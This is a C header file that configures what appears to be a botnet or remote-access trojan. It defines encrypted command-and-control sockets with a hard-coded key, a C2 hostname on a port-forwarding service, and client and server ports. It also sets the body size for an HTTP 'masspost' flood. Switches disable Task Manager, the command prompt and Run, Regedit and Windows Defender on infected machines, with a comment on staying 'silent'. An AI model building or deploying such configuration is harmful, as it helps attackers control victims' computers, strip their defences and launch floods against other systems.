#pragma once
#define ENCRYPT 1 // Encrypt TCP Sockets between C2 and Client
// 0: No encrypt, 1: Encrypt
#if ENCRYPT
#define PASSWRD "passwordpasswordpasswordpassword" // It must have 16/24/32 length
#endif

#define HOST_IP "NK125-36310.portmap.io" // It'll be only used by the client
// It can be an IP or a hostname

// Used if connect (Client) port varies from the listening (Server) port
#define DIFF_PORTS
#ifdef DIFF_PORTS
#define SRV_PORT 1200
#define CLT_PORT 36310
#else
#define CON_PORT 1400
#endif

#define POST_KB 4 // KBs to send in HTTP masspost body
#define DEACT_TASKMGR 1
#define DEACT_CMD 1 // It also deactivates Run (Win+R)
#define DEACT_REGEDIT 1
#define DEACT_WINDEF 1
// 1: Disable the service, 0: Don't do anything
// All need admin, if you want to be silent, set 0 to all

// MACROS that aren't necessary to change
#define PTXT "PING_TXT" // Ping Text
#define PNOK "PONG_OK"  // Pong Text
#define RTTM 5          // Retry Seconds Timeout
#define DELM ","        // TCP Delimiter
#define BUF_SZ 1024     // TCP Buffer Size